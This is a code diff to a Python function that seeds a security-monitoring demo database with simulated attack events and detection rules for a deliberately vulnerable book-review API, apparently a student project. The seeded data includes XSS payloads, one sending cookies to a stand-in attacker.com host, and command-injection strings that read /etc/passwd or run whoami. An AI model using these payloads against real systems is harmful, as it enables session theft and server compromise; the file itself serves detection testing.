@@ -7,6 +7,7 @@ from typing import Any
 from sqlalchemy.orm import Session
 
 from app.db.models import RequestLog, SecurityEvent
+from app.services.security import derive_session_id, map_to_kill_chain_stage
 
 
 def seed_demo_dataset(db: Session) -> dict[str, Any]:
@@ -16,7 +17,7 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
     db.query(RequestLog).delete()
     db.commit()
 
-    now = datetime.datetime.utcnow()
+    now = datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None)
 
     time_points = []
     for m in range(55, 0, -2):
@@ -36,8 +37,8 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
         ("GET", "/api/v1/vulnerable/books/search/", "q=Clean+Code", 200, 19.8, 1840),
         ("GET", "/api/v1/vulnerable/books/search/", "q=Design+Patterns", 200, 25.1, 3100),
         ("GET", "/api/v1/vulnerable/books/search/", "q=FastAPI+Guide", 200, 16.3, 1450),
-        ("POST", "/api/v1/vulnerable/reviews/", '{"book_id": 1, "review_text": "Great book for software architecture!", "rating": 5}', 201, 35.8, 240),
-        ("POST", "/api/v1/vulnerable/reviews/", '{"book_id": 2, "review_text": "Helpful practical examples.", "rating": 4}', 201, 31.2, 235),
+        ("POST", "/api/v1/vulnerable/reviews/", '{"book_id": 1, "author": "PBL6-Simulator", "comment": "Great book for software architecture!"}', 201, 35.8, 240),
+        ("POST", "/api/v1/vulnerable/reviews/", '{"book_id": 2, "author": "PBL6-Simulator", "comment": "Helpful practical examples."}', 201, 31.2, 235),
     ]
 
     total_requests_inserted = 0
@@ -195,21 +196,21 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
         # XSS (10)
         {
             "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
-            "query": None, "body": '{"book_id": 1, "review_text": "<script>alert(\'PBL6-SOC-Test\')</script>", "rating": 5}',
+            "query": None, "body": '{"book_id": 1, "author": "PBL6-Simulator", "comment": "<script>alert(\'PBL6-SOC-Test\')</script>"}',
             "severity": "CRITICAL", "score": 94.0, "rule_id": "XSS-001", "rule_name": "Stored Script Tag Execution",
             "evidence": "<script>alert('PBL6-SOC-Test')</script>", "canonical": "<script>alert('pbl6-soc-test')</script>",
             "pattern": r"(?i)<\s*script[^>]*>.*?<\s*/\s*script\s*>", "location": "BODY", "desc": "Stored XSS payload injected into book review body."
         },
         {
             "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
-            "query": None, "body": '{"book_id": 2, "review_text": "<img src=x onerror=alert(document.cookie)>", "rating": 1}',
+            "query": None, "body": '{"book_id": 2, "author": "PBL6-Simulator", "comment": "<img src=x onerror=alert(document.cookie)>"}',
             "severity": "HIGH", "score": 91.0, "rule_id": "XSS-002", "rule_name": "Image Tag Event Handler Injection",
             "evidence": "<img src=x onerror=alert(document.cookie)>", "canonical": "<img src=x onerror=alert(document.cookie)>",
             "pattern": r"(?i)<\s*img[^>]+onerror\s*=", "location": "BODY", "desc": "Stealing session cookies via broken image fallback handler."
         },
         {
             "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
-            "query": None, "body": '{"book_id": 3, "review_text": "<svg onload=fetch(\'http://attacker.com/steal?c=\'+document.cookie)>", "rating": 3}',
+            "query": None, "body": '{"book_id": 3, "author": "PBL6-Simulator", "comment": "<svg onload=fetch(\'http://attacker.com/steal?c=\'+document.cookie)>"}',
             "severity": "CRITICAL", "score": 97.0, "rule_id": "XSS-003", "rule_name": "SVG Vector Exfiltration",
             "evidence": "<svg onload=fetch(...)>", "canonical": "<svg onload=fetch(...)>",
             "pattern": r"(?i)<\s*svg[^>]+onload\s*=", "location": "BODY", "desc": "Inline SVG element executing exfiltration fetch call."
@@ -223,14 +224,14 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
         },
         {
             "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
-            "query": None, "body": '{"book_id": 1, "review_text": "<body onload=alert(\'XSS\')>", "rating": 4}',
+            "query": None, "body": '{"book_id": 1, "author": "PBL6-Simulator", "comment": "<body onload=alert(\'XSS\')>"}',
             "severity": "HIGH", "score": 86.0, "rule_id": "XSS-004", "rule_name": "Body Element Onload Handler",
             "evidence": "<body onload=alert('XSS')>", "canonical": "<body onload=alert('xss')>",
             "pattern": r"(?i)<\s*body[^>]+onload\s*=", "location": "BODY", "desc": "Body injection executing onload."
         },
         {
             "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
-            "query": None, "body": '{"book_id": 4, "review_text": "<iframe src=\\"javascript:alert(1)\\"></iframe>", "rating": 2}',
+            "query": None, "body": '{"book_id": 4, "author": "PBL6-Simulator", "comment": "<iframe src=\\"javascript:alert(1)\\"></iframe>"}',
             "severity": "HIGH", "score": 89.5, "rule_id": "XSS-005", "rule_name": "Iframe JavaScript Pseudo-Protocol",
             "evidence": '<iframe src="javascript:alert(1)"></iframe>', "canonical": '<iframe src="javascript:alert(1)"></iframe>',
             "pattern": r'(?i)<\s*iframe[^>]+src=["\']?javascript:', "location": "BODY", "desc": "Malicious iframe running script in origin context."
@@ -244,14 +245,14 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
         },
         {
             "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
-            "query": None, "body": '{"book_id": 5, "review_text": "<a href=\\"javascript:alert(document.domain)\\">Click here to win</a>", "rating": 5}',
+            "query": None, "body": '{"book_id": 5, "author": "PBL6-Simulator", "comment": "<a href=\\"javascript:alert(document.domain)\\">Click here to win</a>"}',
             "severity": "MEDIUM", "score": 79.5, "rule_id": "XSS-006", "rule_name": "Anchor Javascript Scheme",
             "evidence": '<a href="javascript:alert(document.domain)">', "canonical": '<a href="javascript:alert(document.domain)">',
             "pattern": r'(?i)<\s*a[^>]+href=["\']?javascript:', "location": "BODY", "desc": "Phishing anchor with embedded JS protocol."
         },
         {
             "type": "XSS", "method": "POST", "path": "/api/v1/vulnerable/reviews/",
-            "query": None, "body": '{"book_id": 2, "review_text": "<input onfocus=alert(1) autofocus>", "rating": 3}',
+            "query": None, "body": '{"book_id": 2, "author": "PBL6-Simulator", "comment": "<input onfocus=alert(1) autofocus>"}',
             "severity": "HIGH", "score": 85.0, "rule_id": "XSS-007", "rule_name": "Autofocus Triggered Execution",
             "evidence": "<input onfocus=alert(1) autofocus>", "canonical": "<input onfocus=alert(1) autofocus>",
             "pattern": r"(?i)<\s*input[^>]+autofocus", "location": "BODY", "desc": "Instant zero-click execution using HTML5 autofocus."
@@ -318,35 +319,35 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
         # Command Injection (5)
         {
             "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
-            "query": None, "body": '{"target": "127.0.0.1; whoami"}', "severity": "CRITICAL", "score": 96.5,
+            "query": None, "body": '{"host": "127.0.0.1; whoami"}', "severity": "CRITICAL", "score": 96.5,
             "rule_id": "CMD-001", "rule_name": "Semicolon Shell Command Chaining",
             "evidence": "; whoami", "canonical": "; whoami",
             "pattern": r";\s*(?:whoami|cat|ls|id|uname)", "location": "BODY", "desc": "Executing whoami to discover web server worker user privilege."
         },
         {
             "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
-            "query": None, "body": '{"target": "127.0.0.1 | cat /etc/passwd"}', "severity": "CRITICAL", "score": 98.0,
+            "query": None, "body": '{"host": "127.0.0.1 | cat /etc/passwd"}', "severity": "CRITICAL", "score": 98.0,
             "rule_id": "CMD-002", "rule_name": "Pipe Command Redirection",
             "evidence": "| cat /etc/passwd", "canonical": "| cat /etc/passwd",
             "pattern": r"\|\s*cat\s+", "location": "BODY", "desc": "Piping ping output into cat to read sensitive system files."
         },
         {
             "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
-            "query": None, "body": '{"target": "127.0.0.1 && id"}', "severity": "HIGH", "score": 92.0,
+            "query": None, "body": '{"host": "127.0.0.1 && id"}', "severity": "HIGH", "score": 92.0,
             "rule_id": "CMD-003", "rule_name": "Boolean AND Command Sequence",
             "evidence": "&& id", "canonical": "&& id",
             "pattern": r"&&\s*id", "location": "BODY", "desc": "Appending id command to verify root/sudo access."
         },
         {
             "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
-            "query": None, "body": '{"target": "127.0.0.1 `uname -a`"}', "severity": "HIGH", "score": 89.0,
+            "query": None, "body": '{"host": "127.0.0.1 `uname -a`"}', "severity": "HIGH", "score": 89.0,
             "rule_id": "CMD-004", "rule_name": "Backtick Shell Sub-execution",
             "evidence": "`uname -a`", "canonical": "`uname -a`",
             "pattern": r"`[^`]+`", "location": "BODY", "desc": "Backtick command interpolation for OS architecture fingerprinting."
         },
         {
             "type": "COMMAND_INJECTION", "method": "POST", "path": "/api/v1/vulnerable/admin/ping/",
-            "query": None, "body": '{"target": "127.0.0.1 $(sleep 5)"}', "severity": "HIGH", "score": 91.0,
+            "query": None, "body": '{"host": "127.0.0.1 $(sleep 5)"}', "severity": "HIGH", "score": 91.0,
             "rule_id": "CMD-005", "rule_name": "Shell Expansion Subshell Injection",
             "evidence": "$(sleep 5)", "canonical": "$(sleep 5)",
             "pattern": r"\$\([^)]+\)", "location": "BODY", "desc": "Command substitution used for time-based blind verification."
@@ -366,6 +367,21 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
         if atk["query"]:
             url = f"{url}?{atk['query']}"
 
+        score = atk["score"]
+        # Seed realistic action and response status
+        if score >= 90.0:
+            action = "BLOCKED"
+            resp_status = 403
+        elif score >= 80.0:
+            action = "BLOCKED" if idx % 2 == 0 else "RATE_LIMIT"
+            resp_status = 403 if action == "BLOCKED" else 429
+        elif score >= 75.0:
+            action = "RATE_LIMIT" if idx % 2 == 0 else "MONITOR"
+            resp_status = 429 if action == "RATE_LIMIT" else 200
+        else:
+            action = "MONITOR"
+            resp_status = 200
+
         req_log = RequestLog(
             request_id=req_id,
             timestamp=event_time,
@@ -377,7 +393,7 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
             headers=json.dumps({"Host": "localhost:8000", "User-Agent": "PBL6-Security-Scanner/2.0"}),
             query_params=atk["query"],
             body_hash=None,
-            response_status=200,
+            response_status=resp_status,
             response_time_ms=round(random.uniform(20.0, 65.0), 1),
             response_size=random.randint(300, 1800),
         )
@@ -431,13 +447,15 @@ def seed_demo_dataset(db: Session) -> dict[str, Any]:
             client_ip=attacker_ip,
             attack_type=atk["type"],
             severity=atk["severity"],
-            action="MONITOR",
+            action=action,
             risk_score=atk["score"],
             rule_score=atk["score"],
             ml_score=None,
             anomaly_score=None,
             behavior_score=None,
             details=json.dumps(details_obj),
+            session_id=derive_session_id(attacker_ip, event_time),
+            kill_chain_stage=map_to_kill_chain_stage(atk["type"]),
         )
         db.add(sec_event)
         total_events_inserted += 1
